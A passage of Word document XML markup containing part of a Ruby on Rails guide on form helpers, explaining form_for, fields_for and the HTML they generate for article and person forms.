      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> hash, HTML options are passed in the </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:html</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> hash. Also you can provide a </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:namespace</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> option for your form to ensure uniqueness of id attributes on form elements. The namespace attribute will be prefixed with underscore on the generated HTML id.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E3C3736" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="86"/>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method yields a </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>form builder</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> object (the </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> variable).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="571EEB1B" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="86"/>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Methods to create form controls are called </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>on</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the form builder object </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="582E588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The resulting HTML is:</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3AD78563" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="050623B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w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>accept-charset="UTF-8"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>action="/articles/create"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>method="post"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>class="nifty_form"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="57949E3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id="article_title"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>name="article[title]"</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7B87489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&lt;textarea</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>id="article_body"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>name="article[body]"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>cols="60"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>rows="12"&gt;&lt;/textarea&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0FF8150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name="commit"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>type="submit"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>value="Create"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3B4AACE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&lt;/form&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="792509A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name passed to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controls the key used in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to access the form’s values. Here the name is </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>article</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and so all the inputs have names of the form </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>article[</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>attribute_name</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. Accordingly, in the </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>create</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> action </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>params[:article]</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> will be a hash with keys </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:title</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:body</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. You can read more about the significance of input names in the parameter_names section.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CEFE14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The helper methods called on the form builder are identical to the model object helpers except that it is not necessary to specify which object is being edited since this is already managed by the form builder.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39A113B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You can create a similar binding without actually creating </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>&lt;form&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> tags with the </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>fields_for</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> helper. This is useful for editing additional model objects with the same form. For example if you had a Person model with an associated ContactDetail model you could create a form for creating both like so:</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5CF520BA" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="737E278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form_for @person, :url</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; { :action</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "create"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>} do</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|person_form| %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="49C01E6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person_form.text_field :name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6A5BD2C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fields_for @person.contact_detail do</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|contact_details_form| %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5FB0EE7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contact_details_form.text_field :phone_number</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21B8EF2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4EBA525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42F572F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which produces the following output:</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66BDF64E" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5D4816B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w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>accept-charset="UTF-8"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>action="/people/create"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>class="new_person"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>id="new_person"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>method="post"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="319C520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id="person_name"</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name="person[name]"</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5503D7C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id="contact_detail_phone_number"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>name="contact_detail[phone_number]"</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0F7A6D4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&lt;/form&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="209F082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object yielded by </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>fields_for</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> is a form builder like the one yielded by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(in fact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calls </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>fields_for</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> internally).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="100940CD"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2.3 Relying on Record Identification</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E07B08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Article model is directly available to users of the application, so — following the best practices for developing with Rails — you should declare it </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a resource</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">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2280"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="13E13100" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
